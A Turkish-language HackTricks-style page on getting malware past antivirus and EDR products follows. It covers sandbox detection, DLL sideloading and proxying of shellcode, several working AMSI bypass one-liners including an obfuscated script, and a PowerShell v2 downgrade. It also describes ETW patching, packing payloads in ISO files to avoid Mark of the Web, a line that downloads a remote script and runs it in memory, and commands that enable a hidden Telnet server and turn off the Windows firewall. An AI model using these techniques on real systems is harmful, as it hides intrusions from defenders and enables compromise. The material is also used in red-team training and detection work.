# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## **AV Kaçınma Metodolojisi**

Şu anda, AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanıyor; statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranışsal analiz.

### **Statik tespit**

Statik tespit, bir ikili dosyada veya betikte bilinen kötü amaçlı dizeleri veya bayt dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak gerçekleştirilir (örneğin, dosya açıklaması, şirket adı, dijital imzalar, simge, kontrol toplamı vb.). Bu, bilinen kamu araçlarını kullanmanın sizi daha kolay yakalanmanıza neden olabileceği anlamına gelir, çünkü muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür tespiti aşmanın birkaç yolu vardır:

- **Şifreleme**

Eğer ikili dosyayı şifrelerseniz, AV'nin programınızı tespit etmesi imkansız hale gelir, ancak programı bellek içinde deşifre edip çalıştırmak için bir tür yükleyiciye ihtiyacınız olacaktır.

- **Obfuscation**

Bazen tek yapmanız gereken, ikili dosyanızdaki veya betiğinizdeki bazı dizeleri değiştirmektir, ancak bu, neyi obfuscate etmeye çalıştığınıza bağlı olarak zaman alıcı bir görev olabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ancak bu çok zaman ve çaba gerektirir.

> [!NOTE]
> Windows Defender statik tespitine karşı kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'dir. Temelde dosyayı birden fazla segmente ayırır ve ardından Defender'dan her birini ayrı ayrı taramasını ister, bu şekilde, ikili dosyanızdaki işaretlenmiş dizelerin veya baytların tam olarak ne olduğunu size söyleyebilir.

Bu [YouTube çalma listesine](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) göz atmanızı şiddetle tavsiye ederim, pratik AV Kaçınma hakkında.

### **Dinamik analiz**

Dinamik analiz, AV'nin ikili dosyanızı bir kumanda kutusunda çalıştırması ve kötü amaçlı etkinlikleri izlemesidir (örneğin, tarayıcınızın şifrelerini deşifre etmeye ve okumaya çalışmak, LSASS üzerinde minidump yapmak vb.). Bu kısım biraz daha karmaşık olabilir, ancak kumanda kutularını aşmak için yapabileceğiniz bazı şeyler var.

- **Çalıştırmadan önce uyku** Uygulamanın nasıl uygulandığına bağlı olarak, AV'nin dinamik analizini aşmanın harika bir yolu olabilir. AV'lerin dosyaları taramak için çok kısa bir süreleri vardır, bu nedenle uzun uyku süreleri, ikili dosyaların analizini bozabilir. Sorun, birçok AV'nin kumanda kutularının, nasıl uygulandığına bağlı olarak, uyku süresini atlayabilmesidir.
- **Makinenin kaynaklarını kontrol etme** Genellikle kumanda kutuları çalışmak için çok az kaynağa sahiptir (örneğin, < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı olabilirsiniz, örneğin CPU'nun sıcaklığını veya hatta fan hızlarını kontrol ederek, her şey kumanda kutusunda uygulanmayabilir.
- **Makineye özgü kontroller** Eğer "contoso.local" alanına katılmış bir kullanıcının iş istasyonunu hedeflemek istiyorsanız, bilgisayarın alanını kontrol edebilir ve belirttiğinizle eşleşip eşleşmediğini görebilirsiniz, eğer eşleşmiyorsa, programınızın çıkmasını sağlayabilirsiniz.

Microsoft Defender'ın Kumanda Kutusu bilgisayar adının HAL9TH olduğunu öğreniyoruz, bu nedenle, patlamadan önce kötü amaçlı yazılımınızda bilgisayar adını kontrol edebilirsiniz, eğer ad HAL9TH ile eşleşiyorsa, Defender'ın kumanda kutusunun içindesiniz demektir, bu nedenle programınızın çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kumanda kutularına karşı gitmek için [@mgeeky](https://twitter.com/mariuszbit)'den bazı gerçekten iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **kamu araçları** sonunda **tespit edilecektir**, bu nedenle kendinize bir şey sormalısınız:

Örneğin, LSASS'ı dökmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve aynı zamanda LSASS'ı döken farklı bir projeyi mi kullanabilirsiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz'ı bir örnek olarak alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen kötü amaçlı yazılım parçasıdır, proje kendisi süper havalı olsa da, AV'leri aşmak için çalışmak bir kabus haline gelir, bu nedenle ulaşmaya çalıştığınız şey için alternatifler arayın.

> [!NOTE]
> Kaçınma için yüklerinizi değiştirirken, lütfen Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve lütfen, cidden, **VIRUSTOTAL'A YÜKLEMEYİN** eğer amacınız uzun vadede kaçınma elde etmekse. Eğer yükünüzün belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, bunu bir VM'ye kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXE'ler vs DLL'ler

Mümkün olduğunda, her zaman **kaçınma için DLL'leri kullanmayı önceliklendirin**, deneyimlerime göre, DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir, bu nedenle bazı durumlarda tespiti önlemek için kullanmak için çok basit bir hiledir (tabii ki yükünüzün bir DLL olarak çalıştırılma yolu varsa).

Bu görüntüde gördüğümüz gibi, Havoc'tan bir DLL Yüklemesi antiscan.me'de 4/26 tespit oranına sahipken, EXE yüklemesi 7/26 tespit oranına sahiptir.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE yüklemesi ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla daha gizli olabileceğiniz bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, yükleyici tarafından kullanılan DLL arama sırasından yararlanarak hem kurban uygulamasını hem de kötü amaçlı yükleri yan yana konumlandırır.

DLL Sideloading'e duyarlı programları kontrol etmek için [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell betiğini kullanabilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi** şiddetle tavsiye ederim, bu teknik düzgün yapıldığında oldukça gizli, ancak kamuya açık bilinen DLL Sideloadable programları kullanırsanız, kolayca yakalanabilirsiniz.

Sadece bir programın yüklemeyi beklediği isimde kötü niyetli bir DLL yerleştirmek, yüklemenizi çalıştırmaz, çünkü program o DLL içinde bazı belirli işlevler bekler. Bu sorunu çözmek için, **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü niyetli) DLL'den orijinal DLL'ye yaptığı çağrıları ileterek, programın işlevselliğini korur ve yüklemenizin yürütülmesini yönetebilir.

[@flangvik](https://twitter.com/Flangvik/) tarafından [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve orijinal yeniden adlandırılmış DLL. 

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuzun ( [SGN](https://github.com/EgeBalci/sgn) ile kodlanmış) hem de proxy DLL'nin [antiscan.me](https://antiscan.me) üzerinde 0/26 Tespit oranı var! Bunu bir başarı olarak adlandırırım.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> **Kesinlikle öneririm** [S3cur3Th1sSh1t'in twitch VOD'sini](https://www.twitch.tv/videos/1644171543) DLL Sideloading hakkında izlemenizi ve ayrıca [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) daha derinlemesine tartıştığımız konular hakkında daha fazla bilgi edinmek için izlemenizi.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış süreçler, doğrudan syscalls ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmak için bir yük aracı takımıdır`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Kaçış, sadece bir kedi ve fare oyunudur, bugün işe yarayan yarın tespit edilebilir, bu yüzden mümkünse sadece bir araca güvenmeyin, birden fazla kaçış tekniğini birleştirmeyi deneyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[dosyasız kötü amaçlı yazılım](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturulmuştur. Başlangıçta, antivirüsler yalnızca **diskteki dosyaları** tarayabiliyordu, bu nedenle bir şekilde yükleri **doğrudan bellek içinde** çalıştırabiliyorsanız, antivirüs bunun önüne geçmek için hiçbir şey yapamazdı, çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği, Windows'un bu bileşenlerine entegre edilmiştir.

- Kullanıcı Hesabı Denetimi veya UAC (EXE, COM, MSI veya ActiveX kurulumu yükseltmesi)
- PowerShell (betikler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin, şifrelenmemiş ve karmaşıklaştırılmamış bir biçimde betik içeriğini açığa çıkararak betik davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki uyarıyı üretecektir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Betik çalıştırılan yürütülebilir dosyanın yolunu `amsi:` ile önceden eklediğine dikkat edin, bu durumda powershell.exe.

Diskte herhangi bir dosya bırakmadık, ama yine de AMSI nedeniyle bellek içinde yakalandık.

Ayrıca, **.NET 4.8** ile birlikte, C# kodu da AMSI üzerinden çalıştırılmaktadır. Bu, `Assembly.Load(byte[])` ile bellek içi yürütmeyi yüklemeyi de etkiler. Bu nedenle, AMSI'den kaçınmak istiyorsanız, bellek içi yürütme için daha düşük .NET sürümlerinin (4.7.2 veya daha düşük gibi) kullanılması önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Karmaşıklaştırma**

AMSI esasen statik tespitlerle çalıştığı için, yüklemeye çalıştığınız betikleri değiştirmek, tespitten kaçınmanın iyi bir yolu olabilir.

Ancak, AMSI, birden fazla katmana sahip olsa bile betikleri karmaşıklaştırma yeteneğine sahiptir, bu nedenle karmaşıklaştırma, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu, kaçmayı o kadar da kolay hale getirmiyor. Ancak bazen, yapmanız gereken tek şey birkaç değişken adını değiştirmek ve işinizi görecektir, bu da bir şeyin ne kadar işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, bir DLL'yi PowerShell (aynı zamanda cscript.exe, wscript.exe vb.) sürecine yükleyerek uygulandığı için, ayrıcalıksız bir kullanıcı olarak çalıştırırken bile bununla oynamak mümkündür. AMSI'nin uygulanmasındaki bu kusur nedeniyle, araştırmacılar AMSI taramasından kaçmanın birçok yolunu bulmuşlardır.

**Bir Hata Zorlamak**

AMSI başlatılmasının başarısız olmasını sağlamak (amsiInitFailed), mevcut işlem için hiçbir taramanın başlatılmaması sonucunu doğurur. Bu, başlangıçta [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft, daha geniş kullanımını önlemek için bir imza geliştirmiştir.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tek gereken, mevcut powershell işlemi için AMSI'yi kullanılamaz hale getirmek için bir satır powershell koduydu. Bu satır elbette AMSI tarafından işaretlendi, bu nedenle bu tekniği kullanmak için bazı değişiklikler gereklidir.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın ki, bu gönderi yayımlandığında muhtemelen işaretlenecek, bu nedenle planınızın tespit edilmeden kalmasıysa, herhangi bir kod yayımlamamalısınız.

**Bellek Yaması**

Bu teknik, başlangıçta [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresini bulmayı ve bunu E_INVALIDARG kodunu döndüren talimatlarla üzerine yazmayı içerir; bu şekilde, gerçek taramanın sonucu 0 dönecek ve bu da temiz bir sonuç olarak yorumlanacaktır.

> [!NOTE]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

Powershell ile AMSI'yi atlatmak için kullanılan birçok başka teknik de vardır, bunları öğrenmek için [**bu sayfayı**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoyu**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kontrol edin.

Bu araç [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) ayrıca AMSI'yi atlatmak için bir betik oluşturur.

**Tespit edilen imzayı kaldırma**

Mevcut işlemin belleğinden tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir araç kullanabilirsiniz. Bu araç, mevcut işlemin belleğini AMSI imzası için tarayarak çalışır ve ardından bunu NOP talimatlarıyla üzerine yazarak bellekteki imzayı etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin bir listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**Powershell sürüm 2'yi kullanın**
PowerShell sürüm 2 kullanıyorsanız, AMSI yüklenmeyecek, bu nedenle betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve sorun giderme amaçları için yararlı olabilir, ancak bu aynı zamanda **tespit edilmekten kaçınmak isteyen saldırganlar için bir sorun olabilir**.

PowerShell kaydını atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Modül Kaydını Devre Dışı Bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2'yi kullanıyorsanız, AMSI yüklenmeyecek, bu nedenle betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen PowerShell Oturumu Kullanın**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanarak savunmasız bir PowerShell başlatın (bu, Cobalt Strike'dan `powerpick` tarafından kullanılır).

## Obfuscation

> [!NOTE]
> Birçok obfuscation tekniği, verileri şifrelemeye dayanır; bu, ikili dosyanın entropisini artırır ve AV'lerin ve EDR'lerin bunu tespit etmesini kolaylaştırır. Bununla dikkatli olun ve belki de yalnızca hassas veya gizlenmesi gereken kodunuzun belirli bölümlerine şifreleme uygulayın.

**C# düz metin kodunu obfuscate etmek**, ikili dosyaları derlemek için **metaprogramming şablonları** oluşturmak veya **derlenmiş ikili dosyaları obfuscate etmek** için kullanılabilecek birkaç araç vardır:

- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): .NET uygulamaları için harika bir açık kaynak obfuscator'dır. Kontrol akışı obfuscation, anti-debugging, anti-tampering ve dize şifreleme gibi çeşitli koruma teknikleri sunar. Belirli kod parçalarını obfuscate etmeye bile izin verdiği için önerilmektedir.
- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynak bir çatalını sağlamaktır; bu, [kod obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve değiştirilmezlik yoluyla yazılım güvenliğini artırmayı amaçlamaktadır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, `C++11/14` dilini kullanarak, herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscate edilmiş kod üretmeyi gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamanın kırılmasını isteyen kişinin işini biraz daha zorlaştıracak C++ şablon metaprogramlama çerçevesi tarafından üretilen obfuscate edilmiş işlemler katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli farklı pe dosyalarını obfuscate edebilen bir x64 ikili obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, keyfi yürütülebilir dosyalar için basit bir metamorfik kod motorudur.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan LLVM destekli diller için ince taneli kod obfuscation çerçevesidir. ROPfuscator, normal kontrol akışının doğal kavramını engelleyerek, normal talimatları ROP zincirlerine dönüştürerek bir programı montaj kodu seviyesinde obfuscate eder.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim dilinde yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürüp ardından yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak zararlı uygulamaları çalıştırmaktan korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen, esasen bir itibar temelli yaklaşım ile çalışır; bu, alışılmadık şekilde indirilen uygulamaların SmartScreen'i tetikleyeceği ve böylece son kullanıcının dosyayı çalıştırmasını engelleyeceği anlamına gelir (dosya yine de Daha Fazla Bilgi -> Yine de Çalıştır'a tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen dosyalarla birlikte otomatik olarak oluşturulan bir [NTFS Alternatif Veri Akışı](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) olan Zone.Identifier adında bir akıştır.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'yi kontrol etme.</p></figcaption></figure>

> [!NOTE]
> **Güvenilir** bir imzalama sertifikası ile imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** belirtmek önemlidir.

Payload'larınızın Mark of The Web'i almasını önlemenin çok etkili bir yolu, bunları bir ISO gibi bir konteynerin içine paketlemektir. Bu, Mark-of-the-Web (MOTW) **non NTFS** hacimlere uygulanamayacağı için olur.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'den kaçınmak için çıktı konteynerlerine paketleyen bir araçtır.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Burada [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak yükleri ISO dosyalarının içine paketleyerek SmartScreen'i atlatma için bir demo var.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Windows için Olay İzleme (ETW), uygulamaların ve sistem bileşenlerinin **olayları kaydetmesine** olanak tanıyan güçlü bir günlükleme mekanizmasıdır. Ancak, kötü niyetli faaliyetleri izlemek ve tespit etmek için güvenlik ürünleri tarafından da kullanılabilir.

AMSI'nin devre dışı bırakıldığı (atlatıldığı) gibi, kullanıcı alanı sürecinin **`EtwEventWrite`** fonksiyonunun hemen geri dönmesi sağlanabilir, böylece herhangi bir olayı kaydetmeden. Bu, fonksiyonu bellekte hemen geri dönecek şekilde yamanarak yapılır ve bu süreç için ETW günlüklemesini etkili bir şekilde devre dışı bırakır.

Daha fazla bilgi bulabilirsiniz **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## C# Assembly Reflection

C# ikili dosyalarını bellekte yüklemek bir süredir bilinmektedir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmanın çok iyi bir yoludur.

Yük, diske dokunmadan doğrudan belleğe yükleneceğinden, tüm süreç için AMSI'yi yamalamakla ilgili endişelenmemiz gerekecek.

Çoğu C2 çerçevesi (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# derlemelerini doğrudan bellekte çalıştırma yeteneği sunmaktadır, ancak bunu yapmanın farklı yolları vardır:

- **Fork&Run**

Bu, **yeni bir fedai süreç oluşturmayı** içerir, post-exploitation kötü niyetli kodunuzu o yeni sürece enjekte eder, kötü niyetli kodunuzu çalıştırır ve işiniz bittiğinde yeni süreci öldürür. Bunun hem avantajları hem de dezavantajları vardır. Fork ve çalıştırma yönteminin avantajı, yürütmenin **Beacon implant sürecimizin dışında** gerçekleşmesidir. Bu, post-exploitation eylemimizde bir şeyler ters giderse veya yakalanırsa, **implantımızın hayatta kalma şansının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Davranışsal Tespitler** tarafından yakalanma şansınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation kötü niyetli kodu **kendi sürecine** enjekte etmekle ilgilidir. Bu şekilde, yeni bir süreç oluşturma ve AV tarafından taranma zorunluluğundan kaçınabilirsiniz, ancak dezavantajı, yükünüzün yürütülmesinde bir şeyler ters giderse, **beacon'ınızı kaybetme şansınızın çok daha yüksek** olmasıdır, çünkü çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek istiyorsanız, lütfen bu makaleye göz atın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'una ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ayrıca C# Derlemelerini **PowerShell'den** yükleyebilirsiniz, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) önerildiği gibi, kötü niyetli kodu diğer dillerle çalıştırmak mümkündür, bu da tehlikeye atılmış makinenin **Saldırgan Kontrolündeki SMB paylaşımında kurulu olan yorumlayıcı ortamına erişim sağlaması** ile mümkündür.

Yorumlayıcı İkili dosyalarına ve SMB paylaşımındaki ortama erişim izni vererek, **bu dillerdeki rastgele kodu tehlikeye atılmış makinenin belleğinde çalıştırabilirsiniz.**

Repo, Defender'ın hala betikleri taradığını ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatma konusunda daha fazla esneklik sağladığımızı** belirtmektedir. Bu dillerde rastgele obfuscate edilmemiş ters kabuk betikleri ile yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, bir saldırganın **erişim belirtecini veya bir güvenlik ürünü (örneğin EDR veya AV)** manipüle etmesine olanak tanıyan bir tekniktir, böylece sürecin ölme olasılığını azaltır, ancak kötü niyetli faaliyetleri kontrol etme izinlerine sahip olmaz.

Bunu önlemek için Windows, **dış süreçlerin** güvenlik süreçlerinin belirteçleri üzerinde tutamaç almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gelişmiş Kaçış

Kaçış, çok karmaşık bir konudur, bazen tek bir sistemde birçok farklı telemetri kaynağını dikkate almanız gerekir, bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Karşılaştığınız her ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha Gelişmiş Kaçış tekniklerine dair bir temel edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından verilen bu konuşmayı izlemenizi şiddetle tavsiye ederim.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Kaçış Derinliği üzerine yapılan başka bir harika konuşmadır.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın kötü niyetli bulduğu parçaları kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz, bu araç **ikili dosyanın parçalarını kaldıracak** ve **Defender'ın** kötü niyetli bulduğu parçayı bulana kadar devam edecektir.\
Aynı şeyi yapan başka bir araç ise [**avred**](https://github.com/dobin/avred) olup, hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Sunucusu**

Windows 10'a kadar, tüm Windows'lar **Telnet sunucusu** ile birlikte geliyordu ve bunu (yönetici olarak) yükleyebiliyordunuz:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistemin başlatılmasıyla **başlat** ve **şimdi** çalıştır:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştir** (gizli) ve güvenlik duvarını devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

